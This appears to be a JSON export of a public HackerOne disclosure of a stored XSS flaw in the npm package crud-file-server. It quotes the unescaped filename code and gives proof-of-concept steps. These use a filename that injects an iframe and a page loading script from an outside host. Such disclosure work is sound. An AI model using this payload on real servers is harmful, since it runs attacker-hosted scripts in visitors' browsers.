@@ -1,0 +1,139 @@
+{
+  "id": 311101,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTExMDE=",
+  "url": "https://hackerone.com/reports/311101",
+  "title": "[crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-31T20:38:25.774Z",
+  "submitted_at": "2018-01-31T20:38:25.774Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3726"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-02-17T17:51:51.597Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-02-17T17:51:41.894Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\n**crud-file-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.\n\n## Module\n\n**crud-file-server**\n\nThis package exposes a directory and its children to create, read, update, and delete operations over http.\n\nhttps://www.npmjs.com/package/crud-file-server\n\nversion: 0.7.0\n\nStats\n0 downloads in the last day\n26 downloads in the last week\n220 downloads in the last month\n\n~2500 estimated downloads per year\n\n\n## Description\n\nThis vulnerability exists, because ```name``` which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:\n\n```javascript\n// node_modules/crud-file-server/crud-file-server.js, line 137\n    res.setHeader('Content-Type', 'text/html');\t\t\t\t\t\t\t\t\t\t\t\n    res.write('<html><body>');\n    for(var f = 0; f < results.length; f++) {\n        var name = results[f].name;\n        var normalized = url + '/' + name;\n        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }\n        res.write('\\r\\n<p><a href=\"/' + normalized + '\">' + name + '</a></p>');\n    }\n    res.end('\\r\\n</body></html>');\n```\n## PoC - Steps To Reproduce:\n\n- install ```crud-file-server```\n\n```\n$ npm install crud-file-server\n```\n\n\n- in the directory which will be served via ```crud-file-server```, create file with following name:\n\n```\n\"><iframe src=\"malware_frame.html\">\n```\n\n- create second file with name ```malware_frame.html``` with following content and save it in the same directory:\n\n\n```\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script type=\"text/javascript\" src=\"http://bl4de.tech/poc.js\"></script>\n</body>\n\n</html>\n```\n\nRun ```crud-file-server``` in directory with file with changed filename:\n\n```\n$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080\n\nusage:\n  crud-file-server [options]\n\nthis starts a file server using the specified command-line options\n\noptions:\n\n  -f file system path to expose over http\n  -h log head requests\n  -p port to listen on (example, 80)\n  -q suppress this message\n  -r read only\n  -v virtual path to host the file server on\n\nexample:\n\n  crud-file-server -f c:/ -p 8080 -q -v filez\n\nlistening on :8080/, serving ./\n```\n\nand open ```http://127.0.0.1:8000``` in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:\n\n{F259251}\n\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability can be used to eg. download malware via \"drive-by-download\" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 259251,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/259/251/3a01b57e56be5dab7528af74ae74cd3c9bc6a032/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6DREO5IG%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T025045Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnneVoiheeVrYn06TOHU%2Fq2zgqOC8Sv%2BOKH%2FGAnshAIQIgAPAHqJZ7DjWF3X9HWktBOirApuw%2F19BKR3KmNLS6VgQquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBv%2BAORdmAf2qKtPgiqPBfdxFGQ4gh1bXu4t%2FwfazyZQBKebhdXFQjgNUe34tkbZp7l9aQIkk3VWFtfMyOlRK2oNwIrTg9J4Z%2BCt2N%2FvW0teeJli8qV0vL6ESaeQMlEGRk1WRO0VGr4Qm%2FLIaunnloSdG0lfCIhk1k0TaZAgkrXk9lZIExdoyaTVXMccsNbbWrtbxm8nygt7Gymot6aPm7Y4LoseFs5bzUHNGKkrQLW4PUETKdmhesy3fpKLnEbU4U%2BgvSpSDobTHI7i8q1O2Agsz%2FQ6CzzYW6L9L1JbCdpCABsdDQd5APZOGHGpYriaixGnInxfumF9pCNaq9CxkaK4dAN%2FsJCokmAOWSB8h0%2BDYSOT7UCnNrKNxSKlG0w6R28IL5gidAHNZp2PmCFAVmzz1uzVOX6ilobwTRoe4NgOYyCsIzvjJE6TIy724dBjGtCaxvrKSAFpcy4GYYglas2WUiGxouwm1p8qW6PUsylmixJ8fLdP9TYwGxbk529SnVz90zxdh694yXCbYZhzG8tl%2B3qD5e0%2B2UYl6vm43xclP7rNmGqm%2BTH0V0RjNpGK5Qb7eVpfncFdPI83k64pSZWRNB9JLvv9sUaGw2Hv9ppOCssA%2BpCaKzRhUBDm%2FSkAzi2K%2FHL9MEq7jYRSxbcD5IhaG0ICp3BV19tEyRYYNHGzyswUoKyl51kpKJSMrVOST4BiewjCEotNnSjWEdg7Jv3sBXGJNri2ypIv5%2BNx9SMbAYK6yewK4Iupt9AI%2B0qPD%2F6SyipUvMfjzZBP9haDbfjuJS5inj%2BDmRhXklnVfK4bqUdGo7LNs0k5cY9FrKlqh0H%2Fzt40AITSqW8SzQBHiVrWjEl38BWJe0ajrdqANQsvlH%2FiUIZ3KqzN0T7c9AowmOrjzAY6sQFduaBRItRS0p2ShadMPmvPjxVngd9AVFQNmslDCMNOSMGb%2F%2FR8SbjqnRtL7mkf7pTvwBcswAZUK2xu5IrpfCfZ98fxSJsaMWF8KqiFpmqDbuosWTTB38Rs0Hb4a2pKa1DMZUirIO5mzo6oTNIZvKbSdHMm2d0a0WPQhgZJlkfEB3AOZhnIzzJo%2FT3gKOZNgIc2I%2Bd6muGNebdM6Ly%2BhUnTqk9p9aKzPS6CclS6Ada8bxc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=16a88bff40bcd658e1e4d5cfb4d133487ff632ce9bacaaa1dcf4efc943a34b1f",
+      "file_size": 412920,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-03-19T17:51:41.992Z",
+  "allow_singular_disclosure_after": -250160343.9136263,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "jokebookservice1",
+    "eveeez",
+    "khalooda0x",
+    "japz"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5800,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "crud-file-server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
